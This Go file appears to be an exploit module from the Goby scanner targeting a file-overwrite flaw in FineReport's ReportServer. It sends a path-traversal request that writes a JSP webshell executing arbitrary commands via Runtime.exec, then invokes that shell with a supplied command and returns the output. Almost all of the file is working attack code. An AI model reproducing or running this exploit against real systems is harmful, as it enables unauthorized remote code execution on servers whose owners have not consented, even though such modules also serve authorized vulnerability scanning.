package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "FineReport ReportServer File Overwrite getshell",
    "Description": "FineReport has any file overwrite vulnerability, you can upload JSP Trojan, you need to find the existing jsp file to cover.",
    "Product": "FineReport",
    "Homepage": "https://www.fanruan.com/",
    "DisclosureDate": "2021-04-09",
    "Author": "itardc@163.com",
    "FofaQuery": "app=\"Fanruan-FineReport\" || app=\"帆软-FineReport\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "Name": "cmd",
            "Type": "input",
            "Value": "whoami"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": true,
                "method": "GET",
                "uri": "/"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "getshell"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "fanruansem-FineReport"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10180"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/WebReport/ReportServer")
			cfg.Header.Store("Content-Type", "application/json")
			cfg.VerifyTls = false
			cfg.Data = "{\"__CONTENT__\":\"hello,world\",\"cmd\":\"design_save_svg\",\"op\":\"svginit\",\"filePath\":\"httpchartmapsvg/../../../log.svg.jsp\"}"
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp, err := httpclient.SimpleGet(u.FixedHostInfo + "/WebReport/log.svg.jsp"); err == nil &&
					resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "hello,world") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			webshell := "<%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\")).getInputStream();"
			webshell += "int a = -1;"
			webshell += "byte[] b = new byte[2048];"
			webshell += "while((a=in.read(b))!=-1){out.println(new String(b));}"
			webshell += "%>"

			cfg := httpclient.NewPostRequestConfig("/WebReport/ReportServer")
			cfg.Header.Store("Content-Type", "application/json")
			cfg.VerifyTls = false
			randomFlag := goutils.RandomHexString(16)
			cfg.Data = fmt.Sprintf("{\"__CONTENT__\":\"%s\",\"cmd\":\"design_save_svg\",\"op\":\"svginit\",\"filePath\":\"httpchartmapsvg/../../../log.svg"+randomFlag+".jsp\"}", webshell)
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/WebReport/log.svg" + randomFlag + ".jsp?cmd=" + cmd); err == nil &&
					resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
				if expResult.Success == false {
					// 二次发包
					if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/log.svg" + randomFlag + ".jsp?cmd=" + cmd); err == nil &&
						resp.StatusCode == 200 {
						expResult.Success = true
						expResult.Output = resp.Utf8Html
					}
				}
			}
			return expResult
		},
	))
}
